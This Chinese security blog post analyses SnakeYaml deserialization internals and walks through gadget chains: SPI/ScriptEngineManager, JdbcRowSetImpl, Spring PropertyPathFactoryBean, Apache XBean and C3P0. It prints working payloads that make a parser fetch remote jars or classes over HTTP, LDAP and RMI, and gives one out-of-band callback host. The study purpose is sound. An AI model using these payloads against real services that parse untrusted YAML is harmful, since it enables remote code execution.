<p>继续跟进 <code>dumpAll()</code> 方法，这里面做了具体的业务</p>


<p>这里先 new 了一个 Serializer 类，Serializer 对象里面放了一个 Emitter 对象；后续，Yaml 将序列化的数据保存到 data 这个对象里面暂存，进行处理，我们跟进一下 <code>represent()</code> 方法</p>


<p>跟进 <code>representData()</code> 方法，会过一堆判断，但是都不会进去，因为这个属性值是初始被赋值的，我们未修改。</p>


<p>我们可以看到，基本上没有做数据处理，所以继续跟进 <code>representData()</code></p>


<p>跟进 <code>representJavaBean()</code>，在 <code>representJavaBean()</code> 方法里面，很明显看到我们的对象数据已经保存到了 <code>javaBean</code> 这个变量里面，并把数据按照 key Value 的键值对形式保存到了 <code>properties</code> 变量里</p>


<p>显而易见的是，<code>representJavaBean()</code> 是一个处理数据，也就是 Yaml 序列化的封装的一层，我们继续跟进 <code>representJavaBeanProperty()</code> 方法，<code>representJavaBeanProperty()</code> 方法做了关于把对象当中的数据拆解成键值对的工作。</p>


<p>大致的工作流程就是如上所示，最后我们的键值对会保存到 list 当中，很可惜的是我并没有找到为什么在序列化的时候不去调用对应的 <code>getter</code> 方法。</p>
<p>有兴趣的师傅们可以自行打断点调试一下，，而且我并没有找到关于 <code>public</code> 类为何没有去调用对应的 getter 方法的这么一个代码块，还应该是我自己断点下的不够好，回过头看一看反序列化吧</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>打完断点，开始调试，跟进 <code>load()</code> 方法。</p>
<p>在 <code>load()</code> 方法中会先 new 一个 <code>StreamReader</code>，将 yaml 数据通过构造函数赋给 StreamReader，再调用 <code>loadFromReader()</code> 方法，跟进</p>


<p><code>loadFromReader()</code> 方法调用了 <code>BaseConstructor.getSingleData()</code> 方法，里面的 type 是 <code>java.lang.Object</code>，跟进一下</p>


<p>跟进 <code>getSingleData()</code> 方法中，先创建一个 Node 对象（其中调用 <code>getSingleNote()</code> 会根据流来生成一个文件，即将字符串按照 yaml 语法转为 Node 对象），然后判断当前 Node 是否为空且是否 Tag 为空，若不是则判断 yaml 格式数据的类型是否为 Object 类型、是否有根标签，这里都判断不通过，最后返回调用 <code>constructDocument()</code> 方法的结果；我们继续跟进一下 <code>constructDocument()</code> 方法</p>


<p><code>constructDocument()</code> 方法的最终目的是构建一个完整的 YAML 文件，如果文件是递归结构，再进行二次处理（这里的递归结构其实就是我后面会讲的 <code>[!!]</code> 这个）。我们这里跟进一下 <code>constructObject()</code> 方法</p>


<p><code>constructObject()</code> 方法从指定节点构造对象，如果该节点已经构造了，那就返回一个实例化过的对象</p>


<p>这里我们的节点并没有被构造过，所以会跳到 <code>constructObjectNoCheck()</code> 下，跟进</p>


<p>我们仔细看一看关于节点构造的业务实现：先把当前节点的内容放到 <code>recursiveObjects</code> 里面，<code>recursiveObjects</code> 是一个 Set 集合类。往下进行了一个判断 ———— <code>constructedObjects</code> 是否构造了对应的节点，如果构造了，通过 <code>get()</code> 方法获取到它，如果没有构造，调用 <code>constructor.construct()</code></p>


<p>这时候我们可以看到 <code>constructor</code> 变量是 <code>Constructor</code> 的内部类 ———— <code>ConstructYamlObject</code>，所以我们去到 <code>Constructor$ConstructYamlObject</code> 的 <code>construct()</code> 方法处下个断点。跟进</p>


<p>这里没什么内容，继续跟进，业务不是在外层做的</p>


<p>跟进 construct 会直接跳进 <code>getClassForNode()</code> 这个方法，它是通过反射，给 Node 节点选取合适的构造类。如图，<code>getClassForNode()</code> 通过我们传入的字符串，将 <code>!!</code> 以及后面的内容成功解析，找到了合适的构造类</p>


<p>获取构造类是通过反射获取的，<strong>Y4tacker 师傅还提到了这里可以初始化静态块里面的函数，这是一个很值得被注意的点。</strong></p>


<ul>
<li>获取合适的构造类这一块结束了，我们跟进 <code>getConstructor()</code></li>
</ul>
<p><code>getConstructor()</code> 构造了 JavaBean，并且在后面进行了构造类（也就是上一步合适的构造类）的实例化</p>


<p>继续跟进，<code>constructJavaBean2ndStep()</code> 方法，进行 JavaBean 构造的第二步：其中会获取 yaml 格式数据中的属性的键值对，然后调用 <code>propert.set()</code> 来设置新建的目标对象的属性值</p>


<blockquote>
<p>至此，分析过程全部结束。</p>
</blockquote>
<h4 id="public-的-getter-方法不能被调用的原因"><a href="#public-的-getter-方法不能被调用的原因" class="headerlink" title="public 的 getter 方法不能被调用的原因"></a>public 的 getter 方法不能被调用的原因</h4><blockquote>
<p>关于为什么 public 的类的 getter 方法不能被调用，实际上是因为这里：</p>
</blockquote>
<p>在反序列化的最后一步，会调用 <code>propert.set()</code> 来设置新建的目标对象的属性值</p>


<p>而这个 Property 的设置在<code>org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap</code></p>


<p>可以看到这个如果是 Public 修饰的话，后面会调用 <code>org.yaml.snakeyaml.introspector.FieldProperty#get</code>，这个只是反射获取值</p>



<h2 id="0x03-SnakeYaml-反序列化漏洞之-SPI-链子"><a href="#0x03-SnakeYaml-反序列化漏洞之-SPI-链子" class="headerlink" title="0x03 SnakeYaml 反序列化漏洞之 SPI 链子"></a>0x03 SnakeYaml 反序列化漏洞之 SPI 链子</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>比较类似于 Fastjson 的漏洞，这里的 <code>!!</code> 就是 Fastjson 漏洞里面的 <code>@type</code></p>
<p>与 Fastjson 不同的是，Fastjson 可以调用的 <code>getter/setter</code> 方法的攻击面很宽，而 SnakeYaml 只能够调用非 public，static 以及 transient 作用域的 setter 方法</p>
<blockquote>
<p>下面我们看一看可利用的 Gadgets，因为去挖掘比较费时间，感觉意义可能也不是特别重大，就直接看 Y4tacker 师傅的文章了</p>
</blockquote>
<h3 id="利用-SPI-机制-基于-ScriptEngineManager-利用链"><a href="#利用-SPI-机制-基于-ScriptEngineManager-利用链" class="headerlink" title="利用 SPI 机制 - 基于 ScriptEngineManager 利用链"></a>利用 SPI 机制 - 基于 ScriptEngineManager 利用链</h3><ul>
<li>这一条链子需要重点关注一下，其他的链子可以放一放，比较简单。</li>
</ul>
<h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">newInstance:<span class="number">396</span>, Class (java.lang)  </span><br><span class="line">nextService:<span class="number">380</span>, ServiceLoader$LazyIterator (java.util)  </span><br><span class="line">next:<span class="number">404</span>, ServiceLoader$LazyIterator (java.util)  </span><br><span class="line">next:<span class="number">480</span>, ServiceLoader$<span class="number">1</span> (java.util)  </span><br><span class="line">initEngines:<span class="number">122</span>, ScriptEngineManager (javax.script)  </span><br><span class="line">init:<span class="number">84</span>, ScriptEngineManager (javax.script)  </span><br><span class="line">&lt;init&gt;:<span class="number">75</span>, ScriptEngineManager (javax.script)  </span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)  </span><br><span class="line">construct:<span class="number">557</span>, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)  </span><br><span class="line">construct:<span class="number">341</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)  </span><br><span class="line">constructObject:<span class="number">182</span>, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">constructDocument:<span class="number">141</span>, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">getSingleData:<span class="number">127</span>, BaseConstructor (org.yaml.snakeyaml.constructor)  </span><br><span class="line">loadFromReader:<span class="number">450</span>, Yaml (org.yaml.snakeyaml)  </span><br><span class="line">load:<span class="number">369</span>, Yaml (org.yaml.snakeyaml)  </span><br><span class="line">main:<span class="number">10</span>, Demo (BasicKnow.SnakeymlUnser)</span><br></pre></td></tr></table></figure>


<h4 id="EXP-与攻击"><a href="#EXP-与攻击" class="headerlink" title="EXP 与攻击"></a>EXP 与攻击</h4><p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://ne54u1uv8ygp87bbl3fc5gvvsmycm1.oastify.com\&quot;]]]]\n&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功接收到 URLDNS 请求</p>


<p>但是这个 EXP 只能简单的进行探测，如果要打的化，可以用这一个 Github 项目，其实这个项目在各大 CTF 比赛里面也被经常提及与使用 ———— <a class="link"   target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/" >https://github.com/artsploit/yaml-payload/<i class="fas fa-external-link-alt"></i></a></p>
<p>直接修改代码即可，脚本也比较简单，就是实现了 <code>ScriptEngineFactory</code> 接口，然后在静态代码块处填写需要执行的命令。将项目打包后挂载到 vps 端，使用 payload 进行反序列化后请求到该位置，实现 <code>java.net.URLClassLoader</code> 调用远程的类进行执行命令。</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://localhost:7777/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="SPI-机制"><a href="#SPI-机制" class="headerlink" title="SPI 机制"></a>SPI 机制</h4><p>SPI 以及 ScriptEngineManager 最早是在 SpEL 表达式里面被提到的，这次趁着学习 SnakeYaml 的机会，好好看一遍。</p>
<p>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath 路径下的 <code>META-INF/services</code> 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现</p>
<p>那么如果需要使用 SPI 机制需要在 Java classpath 下的 <code>META-INF/services/</code> 目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p>


<p>SPI是一种动态替换发现的机制，比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现。</p>
<ul>
<li>这里拿 JDBC 的库 ———— mysql-connector-java 来举个例子</li>
</ul>
<p>这里就是在 Java classpath 下的 <code>META-INF/services/</code> 定义实现类。</p>


<p>接着，我们定位到那个类里面进去</p>


<p>继续跟进，去到 <code>java.sql.Driver</code></p>


<p>而数据库有很多种类型，而实现方式不尽相同，而在实现各种连接驱动的时候，只需要添加<code>java.sql.Driver</code>实现接口，然后 Java 的 SPI 机制可以为某个接口寻找服务实现，就实现了各种数据库的驱动连接。</p>
<p><strong>实现细节</strong>：程序会通过 <code>java.util.ServiceLoder</code> 动态装载实现模块，在 <code>META-INF/services</code> 目录下的配置文件寻找实现类的类名，通过 <code>Class.forName</code> 加载进来， <code>newInstance()</code> 反射创建对象，并存到缓存和列表里面。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ul>
<li>在已知 SPI 机制的情况下，自己尝试的独立思考</li>
</ul>
<p>由于 SPI 机制的存在，能够方便很多的开发，方便永远是安全最大的敌人，在正常情况下，SPI 是不存在安全问题的，但是由于它的机制问题，我们不可能不忽视它的安全隐患 ———— 这也是我在前文说的：**”Y4tacker 师傅还提到了这里可以初始化静态块里面的函数，这是一个很值得被注意的点。”**</p>
<p>我们通过 SnakeYaml 能够调用任意 setter 的机制，同样可以调用 <code>ScriptEngineFactory</code> 来实现攻击，因为 <code>ScriptEngineFactory</code> 利用的底层也是 SPI 机制。</p>
<p>通过 yaml_payload 这个工具不难理解，我们去看它的  <code>META-INF/services</code> 目录下的配置文件寻找实现类的类名</p>




<blockquote>
<p>已经分析得差不多了，不妨调试一下<br>后续回过头来，才发现这句 “不妨调试一下”，难度有多么大，其实原理上是和 Fastjson 差不多的，但是因为当时没有把 Fastjson 代码看深，所以理解起 SnakeYaml 的代码就比较累了。没办法，啃。</p>
</blockquote>
<ul>
<li>前面对于基础的反序列化的调试大同小异，这里我们直接从 <code>org.yaml.snakeyaml.constructor.Constructor#getClassForName()</code> 这里开始看，去理解 SPI 机制造成的攻击</li>
</ul>
<p>这里会把所有的类加载进来，把这些类保存到</p>




<p>刚才我们是跟进了这个语句 —— <code>getConstructor(node).construct(node)</code> 的 <code>getConstructor</code> 方法，它的返回值是一个 Construct 类中的内部类</p>


<p>这里我们继续跟进 <code>construct()</code> 方法，前面都是一些简单判断，我们先跳过</p>


<p>关键点在这个地方！</p>


<p>我们先把 snode 里面的 value 拿出来，赋给 <code>possibleConstructors</code>，snode 中就是存储了上文 EXP 中的三个类；会将这三个类的无参构造放进 <code>possibleConstructors</code> 中</p>


<p>而后将获取到的 <code>possibleConstructors</code> 获取到的第一个数组进行赋值并转换成 <code>Constructor</code> 类型，</p>


<p>之后，对 c 进行实例化，我们可以跟进看一下，后续也都是一串 <code>newInstance()</code> 的调用，快进一下，直接到 <code>newInstance0</code> 这里</p>


<p>一开始加载的是 URL 类的，因为我们的 EXP 里面包含了三个类，这就和 Fastjson 的 AutoType 是一样的，前两个类作为第三个类的缓存。</p>




<p>接着，当执行完 <code>newInstance()</code> 的时候，会到 <code>ScriptEngineManager</code> 里面，触发 SPI 机制</p>


<p>init 方法做了一系列赋值，继续往下，跟进 <code>initEngines()</code>。</p>
<p><code>initEngines()</code> 方法这里 <code>ServiceLoader&lt;ScriptEngineFactory&gt;</code> 就是用到 SPI 机制，会通过远程地址寻找 <code>META-INF/services</code> 目录下的 <code>javax.script.ScriptEngineFactory</code> 然后去加载文件中指定的 PoC 类从而触发远程代码执行；跟进 <code>next()</code></p>


<p>会进入 <code>ServiceLoader$LazyIterator#next()</code> 方法，调用了 <code>lookupIterator#next</code>，它里面有一个 <code>nextService()</code> 方法来实现具体的业务</p>


<p>继续跟进，先反射获取的 class 对象，之后 newInstance 实例化,这里第一次实例化的是 <code>NashornScriptEngineFactory</code> 类，之后第二次会去实例化我们远程 jar 中的 PoC 类，从而触发静态代码块&#x2F;无参构造方法的执行来达到任意代码执行的目的</p>




<p>这里执行恶意代码</p>


<p>细究深入的调用栈，应该是这样的</p>


<h2 id="0x04-SnakeYaml-反序列化漏洞的-Gadgets"><a href="#0x04-SnakeYaml-反序列化漏洞的-Gadgets" class="headerlink" title="0x04 SnakeYaml 反序列化漏洞的 Gadgets"></a>0x04 SnakeYaml 反序列化漏洞的 Gadgets</h2><h3 id="在说-gadgets-之前有一些很有必要的基础知识"><a href="#在说-gadgets-之前有一些很有必要的基础知识" class="headerlink" title="在说 gadgets 之前有一些很有必要的基础知识"></a>在说 gadgets 之前有一些很有必要的基础知识</h3><p>我们先来看一看 SPI 链子的 EXP </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[[!!java.net.URL [\&quot;http://ne54u1uv8ygp87bbl3fc5gvvsmycm1.oastify.com\&quot;]]]]\n&quot;</span>;  </span><br></pre></td></tr></table></figure>

<p>这里的 <code>[!!</code> 是作为 <code>javax.script.ScriptEngineManager</code> 的属性的，就等于我调用了 <code>javax.script.ScriptEngineManager</code> 这个类，其实我是在调用它的构造函数，如图，这是 <code>javax.script.ScriptEngineManager</code> 的构造函数</p>


<p>我们传进去的 URLClassLoader 是作为 ClassLoader 传进去的，所以这个就传成功了</p>
<p>那么后面的 <code>java.net.URL</code> 呢，它是 <code>[[!!</code> 打头，说明是 URLClassLoder 的内部属性，我们可以去看 URLClassLoader 的构造函数，它要求我们传入一个 URL 类，所以 EXP 是这么来的</p>


<p>有很多师傅的文章里面没有提及这一条，当时我自己也是没搞懂索性在<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3" >奶思师傅<i class="fas fa-external-link-alt"></i></a>的一些指点下，弄得非常明白了！</p>
<p>这里的内容也印证之前反序列化的内容中，说的那条递归结构，就是这个意思</p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><ul>
<li>调用链比较简单，尾部是 JNDI 注入，是在 <code>com.sun.rowset.JdbcRowSetImpl</code> 的 <code>connect()</code> 方法</li>
</ul>


<p>找到了 <code>setAutoCommit</code> 是可被利用的 setter 方法</p>
<p>调用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit</span><br><span class="line">	JdbcRowSetImpl#connect</span><br><span class="line">		InitialContext#lookup</span><br></pre></td></tr></table></figure>

<p>是相对简单的，这里不再做分析</p>


<p>同样 RMI 也可以</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>同时，我们要去触发的恶意 <code>dataSource</code> 属性的作用域是private，所以可用</p>
<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringPropertyPathFactoryBeanEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://localhost:1389/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; propertyPath: Drunkbaby\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://localhost:1389/Exploit\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>同样用 RMI 也是可以的</p>
<p>可以看到在 <code>org.springframework.beans.factory.config.PropertyPathFactoryBean#setBeanFactory</code></p>


<p>跟进 <code>getBean()</code></p>


<p>继续跟进，找到 Jndi 注入的地方</p>


<p>当然这里还有个限制是 <code>this.beanFactory.isSingleton(this.targetBeanName)</code>，需要设置 <code>shareableResources</code> 即可</p>
<h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><ul>
<li>无版本限制</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这条链子因为是第一次见，而且感觉这条链子比较有意思，这里我们深入分析一下，也从漏洞发现者的角度出发，思考这条 Gadget</p>
<h4 id="链尾"><a href="#链尾" class="headerlink" title="链尾"></a>链尾</h4><p>在 <code>ContextUtil</code> 的内部类 <code>ReadOnlyBinding</code> 里面的 <code>getObject()</code> 方法里面，调用了 <code>ContextUtil.resolve()</code></p>


<p>跟进看一看  <code>ContextUtil.resolve()</code>，在这里第 55 行，找到了一个 Jndi 注入的注入点</p>


<ul>
<li>此处就找到我们的链尾了</li>
</ul>
<h4 id="EXP-的分析与构造（重要）"><a href="#EXP-的分析与构造（重要）" class="headerlink" title="EXP 的分析与构造（重要）"></a>EXP 的分析与构造（重要）</h4><p>如果按照平常的思路，EXP 该怎么写的？</p>
<p>应该是这样子吧：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot; !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[ \&quot;foo\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;JndiCalc\&quot;, \&quot;http://localhost:7777/\&quot;]]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这个 EXP 师傅们可以自行调试一下，问题在哪儿呢，是在 <code>constructor</code> 类的地方，抛出了异常</p>


<p>抛出异常的信息说：在 <code>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</code> 这里，它的构造函数里面，没有这个对应的属性，我们可以去看一下 <code>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</code> 的构造函数做了什么事</p>


<p><code>value</code> 属性是传入到 <code>resolve()</code> 方法中去的，作为恶意 Reference，那为什么我们不直接修改 value 的属性呢？我们也可以写一个 EXP 来测试一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot; !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot; value: !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;JndiCalc\&quot;, \&quot;http://localhost:7777/\&quot;]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在调试的过程中发现，会进入到 <code>SafeConstructor</code> 这个类</p>


<p>接着就会抛出异常</p>


<p>虽然但是，这个地方返回值是一个 Map 类型的值，不禁让我想起了 Fastjson JdbcRowSetImpl 那条 EXP 里面，用到过这种绕过姿势，所以我觉得这个地方是有潜力可挖的（埋个坑，后续分析</p>
<ul>
<li>回归正题，为什么会造成这个影响呢？这其实和 value 的作用域有关</li>
</ul>
<p>value 作用域是 final，是不可以随意修改的，连反射也无法修改它，所以这里就进入到了 <code>SafeConstructor</code></p>
<blockquote>
<p>那么要如何才能给 value 赋值呢？这里就用到了 <code>BadAttributeValueExpException</code> 这个类</p>
</blockquote>


<p>由于 val 这里接受的是一个 Object 类，所以我们可以把 <code>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</code> 作为 val 传入，太妙了！</p>
<p>我们尝试构造这么一个 EXP，把参数传进去</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">test3</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[value: !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;JndiCalc\&quot;, \&quot;http://localhost:7777/\&quot;]]]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里的 EXP 证明我的想法是对的，加载到了 <code>BadAttributeValueExpException</code></p>


<p>但是这里，子类加载不进来了，所以抛出了异常，原因是没有把构造函数搞全</p>


<p>因为要传全构造函数，所以我们这里还应该传入 <code>Context context</code> 以及 <code>String name</code>，对于 Context，我们选择传入 <code>org.apache.xbean.naming.context.WritableContext</code></p>
<p>所以这么一条 EXP 就构造出来了，现在我们要去思考如何触发 <code>getObject()</code> 方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +  </span><br><span class="line">        <span class="string">&quot;[\&quot;Drunkbaby\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;JndiCalc\&quot;, \&quot;http://localhost:7777/\&quot;],&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其实这个 EXP 误打误撞的碰上了，我们再去看一眼 <code>BadAttributeValueExpException</code> 的构造函数</p>


<p>它调用了 <code>toString()</code> 方法，而 val 正是我们后面通过 Yaml 传进去的 <code>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding</code>，它是没有 <code>toString()</code> 方法的，但是它的父类是有的，这和 Fastjson 里面也非常相似。</p>


<p>父类的 <code>toString()</code> 方法调用了 <code>getObject()</code> 方法，所以这条链子就成立了，太妙了</p>



<h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><ul>
<li>C3P0 这条链子在 C3P0 的文章里面已经有比较细致的跟过了，这里便不再赘述，放个 EXP</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JndiRefForwardingDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span 